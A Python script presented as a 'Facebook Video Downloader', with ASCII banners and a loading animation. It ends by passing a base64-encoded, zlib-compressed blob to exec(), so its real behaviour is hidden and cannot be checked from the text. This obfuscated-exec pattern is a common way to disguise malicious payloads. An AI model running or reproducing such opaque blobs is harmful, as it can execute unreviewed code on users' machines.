# Author: Aniket Dinda
# Site: https://hackingivla.wordpress.com
#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
import re, time
import requests as r
from os import system
import wget, gzip, lzma, base64, zlib

os.system('cls' if os.name == 'nt' else 'clear')
system(
    "mode con: cols=72 lines=27" if os.name == "nt" else "resize -s 90 150 > /dev/null"
)

def start_banner():
    pass
    print(
        r"""
                                                
            `7MMMMMYMM    `7MMF'   `7MF'   `7MMMMMYb.   
              MM    `7      `MA     ,V       MM    `Yb. 
              MM   d         VM:   ,V        MM     `Mb 
              MM""MM          MM.  M'        MM      MM 
              MM   Y          `MM A'         MM     ,MP 
              MM       ,,      :MM;     ,,   MM    ,dP' 
            .JMML.     db       VF      db .JMMmmmdP'   

         [  FACEBOOK           VIDEO         DOWNLOADER   ]
        """

    )                   
    print("\n\n\t\t     >>>   Made By Aniket   <<< ")
#    print("\t\t     ___________________________")
    print("\n")
    print("    \t\t\t      Loading:      ")

    
    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
    print("\n\n")
    for i in range(len(animation)):
        time.sleep(0.4)
        sys.stdout.write("   \r\t\t\t    " + animation[i % len(animation)])
        sys.stdout.flush()
    print("\n")
                     
                                            
start_banner()



os.system('cls' if os.name == 'nt' else 'clear')
def menu_banner():
    pass
    print(
        r"""       
                  _               _  
                 |_     \  /     | \ 
                 |   o   \/   o  |_/ 

        [    Facebook  Video  Downloader   ]
        """
    )             

system(
    "mode con: cols=78 lines=27" if os.name == "nt" else "resize -s 90 150 > /dev/null"
)
menu_banner()
exec(zlib.decompress(base64.b64decode('eJztVV1P2zAUffevuESTkowQqbDtAcmaWJdRPstamIQATW5yaQ2pHWy3Jfz62Un6ASuTJm17WlQ1N9fnHh9fHyd8XEhlQJea5LRQXBiClItiYsgTPcJyIJnKDoRBpSaFIXe0X2qD4+SRGzKl52WBiVJSkR61FLE2mbSVh9UDOgyv+aUmJ1TqWLAxkomLdMVD2i4umBmRTy4aokln2bxKYWS4LWDU3WKdIxbkkiobIlPpaIl7mKA2GpgGRR6oint1JnlMsTBcCiJt8tySOHmljdtSCEzdUK1f2JydnNwqObZqgS/64lQ2TzOLiIZPvIjypzGLBkzjh3ckoS4fZ3Imcskyskc/BSHRtB3fSS6CvZCk1L9+bA2uto98kgfetbgWXkgyvIXzINwl4HJm6+frC0txIOU9fOMZSvjczIBqDdYSQs1tAFrxAgzHcgY91DKfuNXWVHOwhW6vQDt8OHoVWxHvxOC2fiW3Rsrb1671sm0P6q7YuEsx8N4AJKfnSQ8uuxc9aHe6B+1kF+wov4UupV7Lsz0zqrT/sO8KEudPYPCiX2dSG7joHVe1AB26HysscgsKvHHsRV6VHlIRdFxg6GXg6+y7VumuF8SbH0PPj4axwUcTXrVuCGDlJiidzdBNblV3u2f9jQ1Y2gkqP8WOusHLNfjGijV4BfuwBruPAhXLayzY34GYspxnbmnL0uApugvnhfcg7yN4mHBjuBhWyzwMWstppg2w7tMJK+FM8SkzuI4+15WgETWL9i3a5Ee+H9Zc1f5V0alUY6v368TSmNJ2f3PkRiaBn+baB7uLJ5T6wvgVN9isPc1LmuZ41E/mavOm2c6+YcpgtrDrfGXPi5JgFGkX9OKZ4gaD9Lm+31Hh/L1hd6Cef37ArQSbrMhY8L7ubUgwb9y5/Xfc2XfuHP13ZyeDKSrt1iKkATblORvkuOrUgvaXTh39yqnVC2/Fp8W/9GnxR3360qOv+nPHq7847j1eS2v6ZnNXWzeL/ZPVh9P5/AfYc2Fs')))
